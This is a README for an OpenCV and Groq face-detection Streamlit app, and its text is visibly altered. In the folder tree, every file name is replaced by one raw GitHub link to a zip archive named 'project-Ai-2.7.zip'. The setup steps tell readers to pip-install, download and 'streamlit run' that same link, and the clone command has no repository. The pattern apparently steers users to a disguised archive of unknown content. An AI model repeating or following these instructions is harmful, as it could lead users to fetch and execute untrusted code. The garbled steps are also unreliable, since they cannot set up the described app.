# 7️⃣ Face Detection App (OpenCV + Groq Inference)

Real-time face detection with Groq acceleration. Upload an image, OpenCV detects faces, and an LLM provides the face count along with a short, human-friendly description of the photo.

---

## Features

- **Face Detection:** Uses OpenCV Haar Cascade to detect faces in any uploaded image.
- **LLM Analysis:** The detected face data is fed to a Groq-powered LLaMA model (or local fallback) to generate:
  - Face count in a natural sentence.
  - Short description of the photo scene.
  - Suggestion for improving detection quality.
- **Real-Time Visualization:** Bounding boxes are drawn on detected faces for visual feedback.
- **Easy to Use:** Upload an image via Streamlit interface and see instant results.

---

## Folder Structure

project-7/
├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # Streamlit frontend
├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # OpenCV face detection
├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # LLM integration for face count & description
├── models/
│ └── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # Haar cascade file
├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
└── .env # Optional: GROQ_API_KEY for cloud inference

yaml


---

## Setup Instructions

1. **Clone the repository**:

```bash
git clone
cd project-7
Create virtual environment:

bash
python -m venv venv

source venv/bin/activate   # macOS/Linux
venv\Scripts\activate      # Windows

Install dependencies:

bash


pip install -r https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
Download Haar Cascade (if not included):

Download https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip

Place it inside the models/ folder.

Add Groq API Key for LLM inference:

init

GROQ_API_KEY=your_groq_api_key_here
Run the app:

bash

streamlit run https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
Open the URL displayed in your terminal (usually http://localhost:8501).

